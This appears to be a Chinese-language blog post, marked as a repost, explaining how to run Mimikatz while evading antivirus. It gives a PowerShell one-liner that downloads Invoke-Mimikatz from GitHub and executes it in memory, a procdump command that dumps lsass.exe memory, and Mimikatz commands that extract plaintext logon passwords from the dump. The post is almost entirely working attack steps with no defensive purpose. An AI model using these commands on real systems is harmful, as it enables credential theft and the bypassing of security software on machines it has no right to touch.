+++
title = "Mimikatz免杀"
author = "Hzllaga"
date =  2018-08-03
description = "由于Powershell天然免杀，我们可以直接用Powershell命令去加载相应的脚本，下载后执行。这种方法是在内存中直接加载，能够绕过杀软的检测。"
categories = ["转载"]
tags = ["Mimikatz","免杀"]
+++
## Powershell
由于Powershell天然免杀，我们可以直接用Powershell命令去加载相应的脚本，下载后执行。这种方法是在内存中直接加载，能够绕过杀软的检测。
{{< highlight powershell >}}
powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz
{{< /highlight >}}

## Procdump + Mimikatz

今天事实上我用的是第二种方法，因为在加载Powershell时意外报了一个句柄错误，查资料也都是一头雾水，感觉好像就只有我碰到了这个问题，后来发现了一种方法，也能够绕过杀软

第一步，上传Procdump到服务器，Procdump是一个Windows Debug工具，而且是微软爸爸官方提供的，所以无论如何杀软都不会把这货列进黑名单的
{{< highlight powershell >}}
procdump.exe -accepteula -ma lsass.exe lsass.dmp
{{< /highlight >}}
![](https://cdn.wtfsec.org/img/20200223171521.jpg)

使用该命令来dump下lsass.exe进程的内存数据，并保存至lsass.dmp文件，然后为了绕过杀软，我们把这个数据包下**载到本地**来分析

使用Mimikatz来进行数据读取
{{< highlight powershell >}}
sekurlsa::minidump lsass.dmp
sekurlsa::logonPasswords full
{{< /highlight >}}
即可提取到明文密码
![](https://cdn.wtfsec.org/img/20200223171602.jpg)
